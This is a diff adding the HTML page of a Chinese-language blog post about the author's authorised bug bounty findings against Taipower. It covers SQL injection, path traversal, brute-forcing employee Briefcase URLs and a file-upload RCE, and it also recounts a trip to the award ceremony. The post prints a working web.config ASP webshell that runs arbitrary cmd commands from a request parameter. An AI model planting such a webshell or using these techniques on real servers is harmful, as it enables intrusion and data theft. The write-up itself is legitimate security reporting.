@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <title>台電 Bug Bounty 參加記 | Kaibro&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <!--<link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/earlyaccess/notosanstc.css">-->
+  <meta name="description" content="前言去年參加了台電舉辦 Bug Bounty 競賽，運氣好刷到第二名，個人認為蠻適合想接觸 Bug Bounty 的人來挑戰。 所以這篇主要介紹台灣的 Bounty Program 和去年參加完台電 Bug Bounty 的一些心得跟遊記，希望能讓有興趣接觸 Bounty 的人看完後也可以找到一點方向。">
+<meta name="keywords" content="BugBounty,Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="台電 Bug Bounty 參加記">
+<meta property="og:url" content="http://blog.kaibro.tw/2023/03/18/台電-Bug-Bounty-參加記/index.html">
+<meta property="og:site_name" content="Kaibro&#39;s blog">
+<meta property="og:description" content="前言去年參加了台電舉辦 Bug Bounty 競賽，運氣好刷到第二名，個人認為蠻適合想接觸 Bug Bounty 的人來挑戰。 所以這篇主要介紹台灣的 Bounty Program 和去年參加完台電 Bug Bounty 的一些心得跟遊記，希望能讓有興趣接觸 Bounty 的人看完後也可以找到一點方向。">
+<meta property="og:image" content="https://i.imgur.com/xDyRWC2.png">
+<meta property="og:image" content="https://i.imgur.com/lcJiN67.png">
+<meta property="og:image" content="https://i.imgur.com/dtjvBaq.png">
+<meta property="og:image" content="https://i.imgur.com/jZ8Kz33.png">
+<meta property="og:image" content="https://i.imgur.com/CbLZ5Oh.png">
+<meta property="og:image" content="https://i.imgur.com/9MhTA0x.png">
+<meta property="og:image" content="https://i.imgur.com/OxbLmIC.jpg">
+<meta property="og:image" content="https://i.imgur.com/QKdNFc5.jpg">
+<meta property="og:image" content="https://i.imgur.com/6EsBDDI.jpg">
+<meta property="og:image" content="https://i.imgur.com/AkYfZNv.jpg">
+<meta property="og:image" content="https://i.imgur.com/XrdDRWy.jpg">
+<meta property="og:image" content="https://i.imgur.com/qRImwPT.jpg">
+<meta property="og:image" content="https://i.imgur.com/ItfvsWc.jpg">
+<meta property="og:image" content="https://i.imgur.com/ojnZhQ4.jpg">
+<meta property="og:image" content="https://i.imgur.com/HnCIpxa.jpg">
+<meta property="og:updated_time" content="2023-03-18T16:55:33.863Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="台電 Bug Bounty 參加記">
+<meta name="twitter:description" content="前言去年參加了台電舉辦 Bug Bounty 競賽，運氣好刷到第二名，個人認為蠻適合想接觸 Bug Bounty 的人來挑戰。 所以這篇主要介紹台灣的 Bounty Program 和去年參加完台電 Bug Bounty 的一些心得跟遊記，希望能讓有興趣接觸 Bounty 的人看完後也可以找到一點方向。">
+<meta name="twitter:image" content="https://i.imgur.com/xDyRWC2.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Kaibro&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img src="/img/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">KaiBro</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>Menu</li>
+						<li>標籤</li>
+						
+						
+						<li>關於</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主頁</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+							<li><a href="http://cv.kaibro.tw/">關於我</a></li>
+				        
+							<li><a href="http://blog.30cm.club/">New Blog</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
+					        
+								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+					        
+								<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
+					        
+								<a class="twitter" target="_blank" href="https://twitter.com/KAIKAIBRO" title="twitter">twitter</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/BugBounty/" style="font-size: 11.67px;">BugBounty</a> <a href="/tags/CTF/" style="font-size: 18.33px;">CTF</a> <a href="/tags/DEFCON/" style="font-size: 13.33px;">DEFCON</a> <a href="/tags/Java/" style="font-size: 13.33px;">Java</a> <a href="/tags/Linux/" style="font-size: 11.67px;">Linux</a> <a href="/tags/NCU/" style="font-size: 15px;">NCU</a> <a href="/tags/NTU/" style="font-size: 11.67px;">NTU</a> <a href="/tags/Pwn/" style="font-size: 16.67px;">Pwn</a> <a href="/tags/Web/" style="font-size: 18.33px;">Web</a> <a href="/tags/筆記/" style="font-size: 20px;">筆記</a> <a href="/tags/開箱/" style="font-size: 10px;">開箱</a> <a href="/tags/開箱文/" style="font-size: 10px;">開箱文</a>
+					</div>
+				</section>
+				
+				
+				
+
+				
+				
+				<section class="switch-part switch-part3">
+				
+					<div id="js-aboutme">Web security菜雞</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">KaiBro</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+			
+				<img src="/img/head.jpg" class="js-avatar">
+			
+			</div>
+			<hgroup>
+			  <h1 class="header-author">KaiBro</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主頁</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+					<li><a href="http://cv.kaibro.tw/">關於我</a></li>
+		        
+					<li><a href="http://blog.30cm.club/">New Blog</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/w181496" title="github">github</a>
+			        
+						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+			        
+						<a class="facebook" target="_blank" href="https://www.facebook.com/w181496" title="facebook">facebook</a>
+			        
+						<a class="twitter" target="_blank" href="https://twitter.com/KAIKAIBRO" title="twitter">twitter</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-台電-Bug-Bounty-參加記" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/03/18/台電-Bug-Bounty-參加記/" class="article-date">
+  	<time datetime="2023-03-18T08:22:34.000Z" itemprop="datePublished">2023-03-18</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      台電 Bug Bounty 參加記
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="tags/BugBounty/" class="js-tag article-tag-list-link color5">BugBounty</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="tags/Web/" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+        
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>去年參加了台電舉辦 Bug Bounty 競賽，運氣好刷到第二名，個人認為蠻適合想接觸 Bug Bounty 的人來挑戰。</p>
+<p>所以這篇主要介紹台灣的 Bounty Program 和去年參加完台電 Bug Bounty 的一些心得跟<del>遊記</del>，希望能讓有興趣接觸 Bounty 的人看完後也可以找到一點方向。</p>
+<a id="more"></a>
+<h2 id="Bug_Bounty__u4ECB_u7D39"><a href="#Bug_Bounty__u4ECB_u7D39" class="headerlink" title="Bug Bounty 介紹"></a>Bug Bounty 介紹</h2><p>Bug Bounty 白話來說，就是讓駭客可以合法挖企業網站漏洞，然後企業根據漏洞嚴重程度給予對應獎金的機制。</p>
+<p>國外 Bug Bounty 風氣興盛，從 <a href="https://www.hackerone.com/" target="_blank" rel="external">Hackerone</a>, <a href="https://www.bugcrowd.com/" target="_blank" rel="external">Bugcrowd</a> 等平台上，就能看到大家日常生活中耳熟能詳的品牌、企業其實大多都有開 Bounty Program 吸引白帽駭客幫忙挖掘漏洞。</p>
+<p>但真的要從中找到漏洞或是賺到大錢，其實也沒有那麼容易，畢竟國外的 Bug Hunter 數量還是蠻多的，過於簡單或是明顯的漏洞基本上都已經被看得差不多了</p>
+<p>想要從大家都已經看爛掉的目標找到洞，不外乎就是要砸大量時間下去研究沒有人想過、看過的攻擊面向，或是等新功能推出時搶先他人發現漏洞等。</p>
+<p>只是大家很容易忽略一個重點：愈少人看的目標，理論上相對容易挖到漏洞。</p>
+<p>所以據我所知，有個流派就是鑽門去找一些冷僻功能，或是限制特定地區、國家的使用者才能使用的功能，從中去挖掘還沒有人看過的漏洞，競爭對手直接少掉一大半。</p>
+<p>除此之外，其實還有個不算秘訣的小秘訣。</p>
+<p>就是台灣其實自己也有 Bug Bounty Program，而且很多都限制台灣人才能參與，符合我們前面講的原則，理論上難度會相對國外小很多。</p>
+<p>舉例，像是 HITCON Zeroday 平台其實上面就有列了一些可以參與的 Bounty Program:</p>
+<p><a href="https://zeroday.hitcon.org/bug-bounty/list" target="_blank" rel="external">https://zeroday.hitcon.org/bug-bounty/list</a></p>
+<p>而本文的主角-台電，就是上面 Bounty Program 清單成員之一。<br>(不過發文的當下，活動已經下架XD)</p>
+<p>除此之外，台灣偶爾也會舉辦一些漏洞挖掘競賽，其實也是個不錯的入門挑戰目標。</p>
+<p>像是 2020 年的民生公共物聯網漏洞挖掘競賽，小弟曾經和幾個夥伴運氣好刷分刷到第一，舒舒服服抱走 50 萬大獎幫晚餐加菜。</p>
+<p><img src="https://i.imgur.com/xDyRWC2.png" alt=""></p>
+<h2 id="u53F0_u96FB_Bug_Bounty"><a href="#u53F0_u96FB_Bug_Bounty" class="headerlink" title="台電 Bug Bounty"></a>台電 Bug Bounty</h2><p>去年 (2022 年) 台電舉辦了兩次 Bug Bounty 活動，我剛好兩次都有參加到，所以來簡單分享一下挖洞過程。</p>
+<p>上半年的那次，因為工作比較忙的關係，其實總共只有花一天 (嚴格來說是一個中午) 在挖洞而已。</p>
+<p>但還是運氣好挖了兩個高危漏洞：</p>
+<ul>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00160" target="_blank" rel="external">SQL Injection</a></li>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00161" target="_blank" rel="external">Arbitrary File Download</a></li>
+</ul>
+<p>還記得任意檔案下載那個洞，我當時只是簡單的 Google Hacking 找一些 <code>file</code>, <code>download</code> 之類的關鍵字，就發現他的 <code>file.ashx</code> 下載路徑沒有任何檢查，直接 <code>../</code> 就能遍歷目錄去讀檔案。</p>
+<p>另一個 SQL Injection 也是隨手翻翻台電網站時，看到 <code>mid</code> 參數隨手插個單引號，發現行為詭異，深入測試才發現有 SQL Injection 漏洞的。</p>
+<p>從這可以看到，整體漏洞利用難度都非常低，要找到洞也非常容易，也很明顯可以看到打台灣 Bug Bounty 的優勢，競爭者非常少。</p>
+<p><a href="https://www.taipower.com.tw/upload/18/2022070417164521373.pdf" target="_blank" rel="external">https://www.taipower.com.tw/upload/18/2022070417164521373.pdf</a></p>
+<p>最後在這期榜單上排名第五，獎金台幣 $30000。</p>
+<p>雖然獎金不像國外那麼大方，但如果把漏洞挖掘難易度、花費時間考慮進來，其實某種程度上來說頗賺的(?)</p>
+<hr>
+<p>下半年，台電又開了一次 Bug Bounty，而且活動時間只有短短一個月。</p>
+<p>好巧不巧，期間剛好碰到裴洛西訪台事件，導致對岸駭客不斷對台電網站發起攻擊流量。</p>
+<p>所以這段時間，常常會看到這種新聞：<br><a href="https://www.upmedia.mg/news_info.php?Type=24&amp;SerialNo=150939" target="_blank" rel="external">台電單日遭駭客攻擊490萬次　發言人證實：超過6、7月總和</a></p>
+<p>(偷偷說，我那段時間剛好發現一個<a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00587" target="_blank" rel="external">需要暴力窮舉的漏洞</a>，我高度懷疑 490 萬次攻擊流量可能有一半是來自我==)</p>
+<p>這一期活動由於時間比較充裕，而且嚐到上一次的甜頭，所以有稍微花點力氣認真戳一下。</p>
+<p>最後總共挖到這些漏洞：</p>
+<ul>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00587" target="_blank" rel="external">Confidential Information Leak</a></li>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00616" target="_blank" rel="external">Remote Code Execution</a></li>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00617" target="_blank" rel="external">Source Code Leak</a></li>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00619" target="_blank" rel="external">SQL Injection</a></li>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00620" target="_blank" rel="external">Cross-Site Scripting</a></li>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00621" target="_blank" rel="external">Broken Access Control</a></li>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00622" target="_blank" rel="external">Broken Access Control</a></li>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00625" target="_blank" rel="external">Weak Password</a></li>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00629" target="_blank" rel="external">SQL Injection</a></li>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00630" target="_blank" rel="external">SSRF</a></li>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00660" target="_blank" rel="external">Broken Access Control</a></li>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00663" target="_blank" rel="external">Broken Access Control</a></li>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00673" target="_blank" rel="external">Arbitrary File Read</a></li>
+</ul>
+<p>由於漏洞比較多，這裡就挑兩個洞出來講，剩下大家有興趣可以點上面 Report 自己看細節。</p>
+<ol>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00587" target="_blank" rel="external">Confidential Information Leak</a></li>
+</ol>
+<p>這個洞應該算是我這次覺得最有趣的一個洞。</p>
+<p>台電的 webmail 是用 Zimbra 這套，然後我在 Recon 過程時，就發現他們有些員工會用 Zimbra 的 Briefcase 功能分享檔案。</p>
+<p>BriefCase 根據<a href="http://docs.zimbra.com/desktop7/help/en_US/Briefcase/Working_in_Briefcase.htm" target="_blank" rel="external">官方文件</a>可以知道，基本上就是一個可以上傳檔案、共享文件的功能，而且可以 Share 檔案給組織外的人。</p>
+<p>BriefCase 的網址大概長得像這種格式:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://&#123;HOST&#125;/home/&#123;EMAIL&#125;/Briefcase/</div></pre></td></tr></table></figure>
+<p>如果沒有設定 BriefCase 權限的話，外部訪客只要知道網址，就可以列出下面的檔案和下載裡面的資料！</p>
+<p>這邊要利用之前，其實有一個難點要解決，就是 <code>{EMAIL}</code> 的部分，基本上就是員工的 email 地址，但是我們要怎麼知道這間組織裡的員工 email 地址是啥呢？</p>
+<p>好巧不巧，台電員工的 email 命名規則剛剛好是用工號流水號的方式命名，所以我只要暴力窮舉員工工號，就可以看到有誰 BriefCase 下的權限沒設好。</p>
+<p>最後就像報告裡面寫的，還真的炸出一堆人沒設好權限，然後裡面放了一堆高度敏感的檔案可以隨意被下載，像是帳密表、公文、開會簡報、架構圖、行事曆、VPN  金鑰等。</p>
+<p>(有趣的是，我甚至可以拿到他們的開會 Link 進去一起開會XDD)</p>
+<p><img src="https://i.imgur.com/lcJiN67.png" alt=""></p>
+<p>但這個洞最後評審判出來，還比一個不太能利用的 SQL Injection 獎金還低，自己覺得算是頗可惜XD</p>
+<ol>
+<li><a href="https://zeroday.hitcon.org/vulnerability/ZD-2022-00616" target="_blank" rel="external">Remote Code Execution</a></li>
+</ol>
+<p>這個洞也有一點點有趣，簡單說就是一個任意上傳漏洞，寫檔位置和檔案內容都可控，然後環境是 Windows。</p>
+<p>這種場景，正常的思路就是想辦法上傳一個 Webshell 到網頁目錄，就打完收工回家開趴吃炸雞了。</p>
+<p>但這邊我遇到的困境是，我找不到他的網頁根目錄在哪 XD</p>
+<p>嘗試過各種常見的網頁目錄路徑或是各種常見的老梗招都失敗，一度踹到想要放棄。</p>
+<p>後來發現這個上傳功能有個特性，當給的路徑是存在資料夾時，他會回錯誤訊息！</p>
+<p>也就是說，我可以透過錯誤訊息判斷某個資料夾存不存在，例如 <code>C:\windows\</code> 和 <code>C:\kaibro\</code> 就會是不同的 Response。</p>
+<p>這樣做的好處是，我可以判斷我當前路徑是在哪一層，也可以去猜底下有哪些目錄存在，一層一層去找網頁目錄到底在哪。</p>
+<p>最棒的是，他還支援短檔名格式，例如 <code>C:\templates</code> 和 <code>C:\templa~1</code> 結果是相同的，可以減少窮舉的時間。</p>
+<p>直到最後才發現 <code>C:\</code> 底下有個 <code>var</code> 資料夾，然後會 Mapping 到網站 URL 的 <code>/var/*</code> 下。</p>
+<p>但還沒完，這邊我發現直接傳 asp, aspx, asmx 都不會解析，猜測他有對伺服器特別做設定來防禦。</p>
+<p>最後只好搬出老梗招，上傳 <code>web.config</code> 並在裡面塞 webshell，才成功取得 Remote Code Execution 結束這回合。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">system.webServer</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">handlers</span> <span class="attr">accessPolicy</span>=<span class="string">"Read, Script, Write"</span>&gt;</span></div><div class="line">         <span class="tag">&lt;<span class="name">add</span> <span class="attr">name</span>=<span class="string">"web_config"</span> <span class="attr">path</span>=<span class="string">"*.config"</span> <span class="attr">verb</span>=<span class="string">"*"</span> <span class="attr">modules</span>=<span class="string">"IsapiModule"</span> <span class="attr">scriptProcessor</span>=<span class="string">"%windir%\system32\inetsrv\asp.dll"</span> <span class="attr">resourceType</span>=<span class="string">"Unspecified"</span> <span class="attr">requireAccess</span>=<span class="string">"Write"</span> <span class="attr">preCondition</span>=<span class="string">"bitness64"</span> /&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">handlers</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">security</span>&gt;</span></div><div class="line">         <span class="tag">&lt;<span class="name">requestFiltering</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">fileExtensions</span>&gt;</span></div><div class="line">               <span class="tag">&lt;<span class="name">remove</span> <span class="attr">fileExtension</span>=<span class="string">".config"</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">fileExtensions</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">hiddenSegments</span>&gt;</span></div><div class="line">               <span class="tag">&lt;<span class="name">remove</span> <span class="attr">segment</span>=<span class="string">"web.config"</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">hiddenSegments</span>&gt;</span></div><div class="line">         <span class="tag">&lt;/<span class="name">requestFiltering</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">security</span>&gt;</span></div><div class="line">   <span class="tag">&lt;/<span class="name">system.webServer</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--</span></div><div class="line">&lt;%</div><div class="line">Response.Write("-"&amp;"-&gt;")</div><div class="line">Function GetCommandOutput(command)</div><div class="line">    Set shell = CreateObject("WScript.Shell")</div><div class="line">    Set exec = shell.Exec(command)</div><div class="line">    GetCommandOutput = exec.StdOut.ReadAll</div><div class="line">End Function</div><div class="line">Response.Write(GetCommandOutput("cmd /c " + Request("cmd")))</div><div class="line">Response.Write("&lt;!-"&amp;"-")</div><div class="line">%&gt;</div><div class="line">--&gt;</div></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/dtjvBaq.png" alt=""></p>
+<hr>
+<p><a href="https://www.taipower.com.tw/upload/18/2023013115474997409.pdf" target="_blank" rel="external">https://www.taipower.com.tw/upload/18/2023013115474997409.pdf</a></p>
+<p>最後這期排行榜出來，成功刷上第二名，總共拿到台幣 $140000 獎金。</p>
+<p>不過老實說，這次的 C/P 值就沒有上一期那麼高了，畢竟這次可是費了一點力氣才找到 RCE 洞，結果 RCE 對應的獎金才值 3.5 萬元，超哭 XDD</p>
+<p>有趣的是，台電對於弱密碼問題，給的錢其實算是相對蠻高的，可以看到一堆人在洗弱密碼洞，應該也算是一條 C/P 值比較高的打法。</p>
+<p><br></p>
+<p>小插曲：<br>由於台灣 Bug Bounty 通常對於漏洞認定都相對比較模糊，所以我特別問了官方一些有趣的問題：<br><img src="https://i.imgur.com/jZ8Kz33.png" alt=""><br>懂的都懂，未來想洗台電 Bug Bounty 的朋友，看到這張圖，應該知道怎麼做了吧(X)</p>
+<h2 id="u9812_u734E_u5178_u79AE_u66A8_u53F0_u96FB_u79D8_u5883_u65C5_u904A"><a href="#u9812_u734E_u5178_u79AE_u66A8_u53F0_u96FB_u79D8_u5883_u65C5_u904A" class="headerlink" title="頒獎典禮暨台電秘境旅遊"></a>頒獎典禮暨台電秘境旅遊</h2><p>每期台電似乎都會舉辦頒獎典禮，邀請駭客去切磋交流一下，但我上半年那期剛好有事沒辦法去，想說下半年也許可以參加看看。</p>
+<p>最後收到邀請信，看到這期頒獎典禮居然是舉辦在高雄或南投的「秘境」：</p>
+<p><img src="https://i.imgur.com/CbLZ5Oh.png" alt=""></p>
+<p>當下第一眼的反應是: 「ㄎㄅ，這是一個要去深山滅口的節奏嗎？」</p>
+<p>但身為駭客還是要有點冒險精神，而且這些「台電秘境」似乎一般人平時也不容易進得去，錯過似乎有點可惜，所以最後就果斷答應參加了。</p>
+<p>行程上是兩天一夜，第一天是頒獎典禮，第二天是秘境郊遊。</p>
+<p>還記得當天集合點是在台中高鐵站，台電包了一台小巴士，等時間到就發車載去日月潭活動地點。</p>
+<p>令我印象很深刻的是，最後集合時只有我一個白帽駭客到場，其他被邀請的駭客似乎都放棄參加頒獎典禮，心中立馬出現這句話:</p>
+<p><img src="https://i.imgur.com/9MhTA0x.png" alt=""></p>
+<p>然後遊覽車上其他人似乎都是台電長官，有種神秘的氛圍，一路上整台車都蠻安靜的。</p>
+<p>而且不知道為啥，坐在小巴士的當下，有一種跟以前當兵被集合送去營區很類似的感覺XD</p>
+<p><img src="https://i.imgur.com/OxbLmIC.jpg" alt=""></p>
+<p>經過數個小時車程之後，終於能從車窗外看到日月潭，波光粼粼的湖面確實還是挺美的。</p>
+<p><img src="https://i.imgur.com/QKdNFc5.jpg" alt=""></p>
+<p>最後在晚上要入住的日月潭大飯店下車，然後放大家各自回房間休息，等晚上頒獎典禮再集合。</p>
+<p>入住的房間比預期還要好很多，整體來說挺舒服的。</p>
+<p><img src="https://i.imgur.com/6EsBDDI.jpg" alt=""></p>
+<p>中間空檔時間，我就跑去飯店樓下湖邊閒晃，整體景色、氛圍蠻 chill 的：</p>
+<p><img src="https://i.imgur.com/AkYfZNv.jpg" alt=""></p>
+<p>晚上頒獎典禮基本上就是一些吃飯和 social 的環節，值得一提的是，這場頒獎典禮除了我之外，還有另外兩個白帽駭客參加(他們都是自己開車來)，總算不孤單了XD</p>
+<p><img src="https://i.imgur.com/XrdDRWy.jpg" alt=""></p>
+<p>另外，台電還送了一堆精美小禮物，這部分個人覺得蠻用心的，保溫瓶上面還有雕我的 ID，頗潮。</p>
+<p>典禮隔天一大早，就被挖起來去參觀所謂的「台電秘境」，還好昨天典禮被灌了一堆酒，所以比較早睡有睡飽。</p>
+<p>搭車經過一連串山路，最後終於見到秘境本人「銃櫃壩」：</p>
+<p><img src="https://i.imgur.com/qRImwPT.jpg" alt=""></p>
+<p><img src="https://i.imgur.com/ItfvsWc.jpg" alt=""></p>
+<p>雖然是蠻漂亮的，但好像也沒有到想像中驚豔，不過也算是一次特別的經驗。</p>
+<p>除了秘境之外，後面也有被帶到幾個台電相關的景點、電廠去參觀，學到不少台電相關的冷知識和歷史，也是蠻有趣的XD</p>
+<p><img src="https://i.imgur.com/ojnZhQ4.jpg" alt=""></p>
+<p>也吃到了傳說中台電很熱門的冰(?)</p>
+<p><img src="https://i.imgur.com/HnCIpxa.jpg" alt=""></p>
+<p>總括來說是一次蠻特別的經驗，那些因為怕被載去深山滅口而沒來參加的人，下次可以認真考慮一下XD</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/09/02/DEFCON-30-CTF-Final-參加記/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">DEFCON 30 CTF Final 參加記</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">Share to: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+    <a class="jiathis_button_twitter"></a>
+    <a class="jiathis_button_plus"></a> 
+    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+
+
+
+
+<section id="comments">
+  <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'kaibrosblog'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2023 KaiBro
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.1.6/require.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
